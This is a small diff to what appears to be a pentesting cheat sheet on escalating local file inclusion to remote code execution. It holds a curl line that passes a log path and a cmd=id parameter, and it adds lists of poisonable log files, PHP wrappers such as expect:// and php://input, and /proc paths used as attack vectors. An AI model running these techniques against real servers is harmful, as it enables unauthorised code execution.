@@ -52,11 +52,30 @@ curl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id
 
 🛠️ Introduce other examples, like apache session logs
 
+* /var/log/apache/access.log
+* /var/log/apache/error.log
+* /var/log/vsftpd.log
+* /var/log/sshd.log
+* /var/log/mail
+
 ### 🛠️ LFI to RCE \(via phpinfo\)
 
 ### 🛠️ LFI to RCE \(via file upload\)
 
 ### 🛠️ LFI to RCE \(via php wrappers\)
+
+* php://file
+* php://filter
+* php://input
+* expect://
+* data://text/plain;base64,command
+
+### 🛠️ LFI to RCE \(via /proc\)
+
+* /proc/self/environ
+* /proc/self/fd
+
+### 🛠️ LFI to RCE \(via php session\)
 
 🛠️ Introduce php wrappers
 
